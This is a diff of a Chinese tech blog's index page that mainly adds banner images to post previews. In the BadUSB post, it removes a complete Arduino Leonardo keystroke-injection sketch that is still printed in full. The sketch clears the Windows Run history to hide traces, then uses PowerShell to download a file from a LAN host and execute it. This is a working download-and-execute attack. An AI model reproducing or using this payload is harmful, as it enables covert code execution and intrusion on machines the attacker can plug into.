@@ -447,6 +447,16 @@ var _hmt = _hmt || [];
     <article id="post-基于-Arduino-Leonardo-的-BadUSB-下载文件并运行代码" class="article article-type-post" itemscope="" itemprop="blogPost">
     <div class="article-inner">
         
+            
+	
+		<a href="/c47492ae.html" itemprop="url">
+            <img src="/images/banner/BadUSB.png" class="article-banner">
+        </a>
+	
+
+
+
+        
         
             <header class="article-header">
                 
@@ -481,10 +491,10 @@ var _hmt = _hmt || [];
         
         <div class="article-entry" itemprop="articleBody">
         
-            
-            
             <p>Arduino Leonardo 的 BadUSB，适合于 Windows 平台，用 PowerShell 命令下载一个文件，并运行它</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Keyboard.begin(); <span class="comment">// 开始键盘通讯</span></span><br><span class="line">    delay(<span class="number">5000</span>); <span class="comment">// 延时</span></span><br><span class="line">    Keyboard.press(KEY_LEFT_GUI); <span class="comment">// win键</span></span><br><span class="line">    delay(<span class="number">500</span>);</span><br><span class="line">    Keyboard.press(<span class="string">'r'</span>); <span class="comment">// r键</span></span><br><span class="line">    delay(<span class="number">500</span>);</span><br><span class="line">    Keyboard.release(KEY_LEFT_GUI);</span><br><span class="line">    Keyboard.release(<span class="string">'r'</span>);</span><br><span class="line">    Keyboard.press(KEY_CAPS_LOCK); <span class="comment">// 利用开大写输小写绕过输入法</span></span><br><span class="line">    Keyboard.release(KEY_CAPS_LOCK);</span><br><span class="line">    delay(<span class="number">500</span>);</span><br><span class="line">    Keyboard.println(<span class="string">"cmd /c start /min reg delete hkcu\\software\\microsoft\\windows\\currentversion\\explorer\\runmru /f&amp;cmd /c start /min powershell $p = new-object system.net.webclient;$p.downloadfile('http://192.168.1.111/1.jpg', 'd:\\1.jpg');start d:\\1.jpg;exit"</span>);</span><br><span class="line">    Keyboard.press(KEY_CAPS_LOCK);</span><br><span class="line">    Keyboard.release(KEY_CAPS_LOCK);</span><br><span class="line">    delay(<span class="number">500</span>);</span><br><span class="line">    Keyboard.press(KEY_RETURN);  <span class="comment">// 按下回车键</span></span><br><span class="line">    Keyboard.release(KEY_RETURN); <span class="comment">// 释放回车键</span></span><br><span class="line">    Keyboard.end(); <span class="comment">// 结束键盘通讯</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+            <p class="article-more-link">
+                <a href="/c47492ae.html">继续阅览 <i class="zmdi zmdi-chevron-right"></i></a>
+            </p>
         
         </div>
         
@@ -497,6 +507,16 @@ var _hmt = _hmt || [];
 
     <article id="post-英语周报-APP-扫码获取答案-API-分析" class="article article-type-post" itemscope="" itemprop="blogPost">
     <div class="article-inner">
+        
+            
+	
+		<a href="/3a4d505.html" itemprop="url">
+            <img src="/images/banner/API.png" class="article-banner">
+        </a>
+	
+
+
+
         
         
             <header class="article-header">
@@ -548,6 +568,16 @@ var _hmt = _hmt || [];
 
     <article id="post-Pinterest-com-API-分析" class="article article-type-post" itemscope="" itemprop="blogPost">
     <div class="article-inner">
+        
+            
+	
+		<a href="/295aa8a5.html" itemprop="url">
+            <img src="/images/banner/Pinterest.png" class="article-banner">
+        </a>
+	
+
+
+
         
         
             <header class="article-header">
@@ -602,6 +632,16 @@ var _hmt = _hmt || [];
 
     <article id="post-imagemagick-扩展-php7-0-windows-x64-安装步骤" class="article article-type-post" itemscope="" itemprop="blogPost">
     <div class="article-inner">
+        
+            
+	
+		<a href="/cd3b305d.html" itemprop="url">
+            <img src="/images/banner/ImageMagick.png" class="article-banner">
+        </a>
+	
+
+
+
         
         
             <header class="article-header">
